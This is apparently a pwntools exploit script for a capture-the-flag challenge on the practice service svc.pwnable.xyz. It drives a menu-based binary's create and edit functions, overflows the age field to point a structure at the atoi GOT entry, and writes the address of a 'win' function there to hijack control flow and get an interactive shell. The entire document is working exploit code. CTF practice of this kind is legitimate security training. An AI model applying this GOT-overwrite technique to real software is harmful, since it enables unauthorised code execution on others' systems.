from pwn import *
#p = process("./challenge")
p = remote("svc.pwnable.xyz", 30011)
elf = ELF("./challenge")

def create(name, age):
	p.sendlineafter(">", "1")
	p.sendlineafter("Name: ", name)
	p.sendafter("Age: ", age)

def edit(name, age):
	p.sendlineafter(">", "3")
	p.sendlineafter("Name: ", name)
	p.sendlineafter("Age: ", age)

if __name__ == "__main__":
	create("a" * 0x19, "1" * 0x19)
	edit("b" * 0x19, "1"*0x10 + p64(elf.got['atoi']))
	create(p64(elf.symbols['win']), "1" * 0x19)

	p.interactive()
